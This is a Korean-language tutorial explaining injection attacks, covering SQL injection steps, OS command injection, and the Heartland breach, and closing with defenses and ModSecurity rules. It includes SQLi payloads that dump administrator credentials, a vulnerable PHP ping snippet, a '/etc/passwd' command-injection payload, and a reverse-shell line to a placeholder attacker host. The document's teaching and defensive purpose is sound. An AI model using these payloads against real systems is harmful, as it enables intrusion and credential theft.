데이터가 명령이 되는 순간: 인젝션 공격의 모든 것

THREAT LEVEL: CRITICAL (A03)

Security Architect Professional

1. 인젝션의 본질적 이해 (Essential Concept)

인젝션(Injection, 주입) 공격의 핵심은 "데이터(Data)와 명령(Instruction)의 경계가 무너지는 것"에 있습니다. 현대의 컴퓨터 시스템은 처리 효율성을 위해 사용자로부터 전달받은 데이터와 이를 처리하기 위한 명령어를 하나의 스트림(Stream)으로 섞어서 해석기에 전달하는 경우가 많습니다. 공격자는 이 틈을 타 데이터 영역에 특수 기호를 삽입함으로써, 시스템이 데이터를 명령어로 오인하게 만듭니다.

[도식: 인젝션 발생의 구조적 원인 (Structural Cause of Injection)]

Normal Request
SELECT * FROM users WHERE id =
'Alice'
↳ 시스템: "ID가 Alice인 데이터를 찾아라" (의도대로 작동)
Injected Request
SELECT * FROM users WHERE id =
'admin' OR '1'='1' --
↳ 시스템: "모든 유저 정보를 출력하라" (명령어 오인 발생)
Terminology Glossary
  • • Interpreter (인터프리터, 해석기): 프로그래밍 언어나 쿼리문을 실시간으로 읽어 시스템 명령으로 변환하는 엔진(SQL, Bash, Python 등).
  • • Boundary Violation (경계 위반): 데이터로 취급되어야 할 입력값이 문법적 기호로 인식되어 제어 영역을 침범하는 현상.
  • • Untrusted Data (신뢰할 수 없는 데이터): 외부(사용자, 외부 API 등)에서 유입되어 검증되지 않은 잠재적 위협 데이터.
Technical Insight
  • • Metacharacters (메타 문자): 프로그래밍 언어나 시스템에서 특별한 의미(조건문 종료, 주석 처리 등)를 가진 문자들 (예: ', ;, |, --, &).
  • • Input Sanitization (입력값 정제): 위험한 메타 문자를 제거하거나 변경하여 악성 실행을 방지하는 보안 기법.

2. 인젝션의 유형 및 기법 (Taxonomy & Techniques)

인젝션은 데이터를 처리하는 인터프리터의 종류에 따라 분류됩니다. 각 유형은 독특한 문법(Syntax)과 우회 기법을 가지고 있으며, 공격자는 대상 시스템의 환경을 분석하여 최적의 주입 도구를 선택합니다.

SQL Injection

관계형 데이터베이스(RDBMS)를 대상으로 하며, UNION, Error-based, Blind 기법 등을 활용해 DB 서버의 전체 제어권을 획득합니다.

Primary Targets
MySQL, Oracle, PostgreSQL, MS-SQL

Command Injection

OS 쉘 명령어를 직접 주입합니다. Remote Code Execution(RCE)을 통해 서버 내 파일 탈취 및 봇넷 구성에 활용됩니다.

Primary Targets
Linux (Bash), Windows (CMD/PowerShell)

Modern Injections

NoSQL, LDAP, XML, Template Injection 등 현대적인 웹 프레임워크와 클라우드 환경에서 발생하는 신규 유형들입니다.

Primary Targets
MongoDB, Redis, Active Directory, Jinja2
💡 전문가의 팁: 최근에는 SSTI(Server-Side Template Injection)와 같은 기법이 엔터프리이즈 급 애플리케이션에서 자주 발견됩니다. 이는 템플릿 엔진(Thymeleaf, FreeMarker 등)을 직접 조작하여 서버 측에서 임의의 객체를 인스턴스화할 수 있게 하므로 매우 위험합니다.

3. SQL 인젝션 공격 메커니즘 (Attack Mechanism)

Step 01: 탐색 및 정찰 (Reconnaissance)

공격자는 입력 폼(로그인, 검색창 등)에 싱글 쿼트(')나 연산자를 넣어 서버의 에러 발생 여부를 확인합니다. 에러 메시지에 DB 종류나 쿼리문 일부가 노출되면 취약점이 확인된 것입니다.

Step 02: DB 스키마 파악 (Structure Mapping)

ORDER BY 절을 사용하여 현재 조회 중인 컬럼의 개수를 파악하고, UNION SELECT를 통해 공격자에게 노출될 수 있는 컬럼 위치를 확인합니다.

# 컬럼 수 확인 (에러가 날 때까지 숫자를 높임)
' ORDER BY 1 --
' ORDER BY 2 --
# 데이터 노출 테스트 (2번 컬럼이 화면에 나온다고 가정)
' UNION SELECT 1, 'vulnerable_point', 3 --

Step 03: 데이터 탈취 (Exploitation)

Information Schema를 조회하여 시스템 내의 모든 테이블명과 컬럼명을 획득하고, 최종적으로 관리자의 비밀번호나 고객 개인정보를 덤프(Dump)합니다.

# 관리자 계정 정보 탈취 예시
' UNION SELECT 1, CONCAT(username, ':', password), 3 FROM users WHERE isAdmin=1 --

Case Study: Heartland Payment Systems (2008)

세계 최대의 카드 처리 대행사 중 하나였던 하트랜드는 단 한 번의 **SQL 인젝션** 공격으로 인해 약 **1억 3,000만 건**의 신용카드 번호를 탈취당했습니다. 공격자는 SQLi 취약점을 통해 내부 네트워크에 침투한 뒤, 실시간 트래픽을 가로채는 스니퍼를 설치했습니다. 이 사고로 하트랜드는 약 1억 4,000만 달러 이상의 막대한 비용을 보상과 벌금으로 지불해야 했습니다.

Impact
1.3억 건 유출
Loss
$140M+
Vector
SQL Injection
Duration
6 Months+
Technical Terminology
  • • RDBMS (Relational Database Management System, 관계형 데이터베이스 관리 시스템): 테이블 구조로 데이터를 저장하는 DB (MySQL, Oracle 등).
  • • Information Schema (정보 스키마): DB의 메타데이터(테이블명, 컬럼명 등)를 정의하는 표준 시스템 테이블.
  • • Dump (덤프): 데이터베이스의 내용을 파일이나 텍스트 형태로 한꺼번에 추출하는 행위.
Notation & Operators
  • • ORDER BY (정렬): 특정 컬럼을 기준으로 정렬하며, 존재하지 않는 컬럼 번호를 넣으면 에러가 발생하므로 컬럼 수 확인에 활용.
  • • UNION SELECT (합집합 조회): 두 개 이상의 SELECT 결과를 합치며, 이를 통해 시스템 테이블 정보를 외부로 유출.
  • • CONCAT (연산자): 여러 컬럼의 값을 하나의 문자열로 합쳐서 한 번에 출력할 때 사용.

4. OS 커맨드 인젝션 및 리버스 쉘 (Command Injection & Reverse Shell)

애플리케이션이 외부 입력값을 사용하여 시스템 명령어를 구성할 때, 공격자가 명령어 구분자(;, |, &&)를 삽입하면 서버의 운영체제에서 임의의 명령어가 실행됩니다. 이것이 가장 치명적인 **원격 코드 실행(Remote Code Execution, RCE)**으로 이어집니다.

[도식: 리버스 쉘 침투 메커니즘 (Reverse Shell Connection Mechanism)]

공격자 터미널 (Attacker)
nc -lvp 4444
(포트 4444에서 대기 중)
Outbound Connect
방화벽 우회 (Firewall Bypass)
취약한 서버 (Victim)
bash -i >& /dev/tcp/attack_ip/4444 0>&1
(공격자에게 쉘을 보냄)

취약한 시나리오 (Vulnerability)

네트워크 핑 테스트 도구 등을 웹으로 제공할 때 사용자가 주소 뒤에 악성 구문을 덧붙이는 경우입니다.

// PHP 취약 코드 예시
$target = $_GET['ip'];
shell_exec("ping -c 4 " . $target);

공격 페이로드 (Exploit Payload)

세미콜론을 이용하여 기존 명령을 끝내고 공격자가 원하는 시스템 파일을 조회합니다.

127.0.0.1; cat /etc/passwd
Technical Terminology
  • • RCE (Remote Code Execution, 원격 코드 실행): 네트워크를 통해 공격자가 대상 시스템에서 임의의 프로그램을 실행할 수 있는 상태.
  • • Reverse Shell (리버스 쉘): 피해자 서버가 공격자에게 역으로 연결을 시도하도록 하여, 들어오는 통로(Inbound)는 막지만 나가는 통로(Outbound)가 열린 방화벽을 우회하는 기법.
Metacharacter Glossary
  • • ; (Semicolon): 리눅스/윈도우에서 앞 명령의 성공 여부와 관계없이 다음 명령을 순차 실행함.
  • • | (Pipe): 앞 명령어의 출력 결과를 뒤 명령어의 입력값으로 전달함.
  • • && (Logical AND): 앞 명령어가 성공했을 때만 뒤 명령어를 실행함.

5. 통합 보안 아키텍처 및 대응 전략 (Unified Defense Strategy)

01

Query Parameterization

Prepared Statements를 통해 데이터와 쿼리를 분리하십시오. SQL 인젝션을 막는 가장 강력한 표준입니다.

02

Allow-list Validation

위험한 문자를 막는 것보다 **사전에 정의된 패턴(정규식)**만 허용하는 화이트리스트 검증을 적용하십시오.

03

Security Hardening

DB 계정의 권한을 최소화하고, 웹 방화벽(WAF)을 통해 비정상적인 트래픽 유입을 사전에 차단하십시오.

실무 보안 설정: Nginx/ModSecurity

# SQLi 탐지 및 403 차단 룰 예시
SecRule ARGS "@rx (?i)(select|union|update|delete|insert|drop)" \
  "id:1001,phase:2,deny,status:403,log,msg:'SQL Injection Attempt Detected'"

# OS Command Injection 탐지 룰 예시
SecRule ARGS "@rx (?i)(;|\||&&|\`|\$|/bin/bash)" \
  "id:1002,phase:2,deny,status:403,log,msg:'OS Command Injection Attempt Detected'"
Compliance & Defense Initials
  • • SDLC (Software Development Life Cycle, 소프트웨어 개발 생명 주기): 보안이 모든 단계(설계, 구현, 테스트)에 포함되어야 하는 소프트웨어 개발 체계.
  • • WAF (Web Application Firewall, 웹 방화벽): HTTP/HTTPS 트래픽을 지능적으로 분석하여 공격을 차단하는 전용 보안 장비.
Infrastructure Guide
  • • Hardening (하드닝, 강화): 시스템의 취약점을 제거하고 보안 설정을 최적화하여 공격 표면(Attack Surface)을 줄이는 과정.
  • • Least Privilege (최소 권한의 원칙): 사용자나 프로세스에 업무 수행에 필요한 최소한의 권한만 부여하는 원칙.
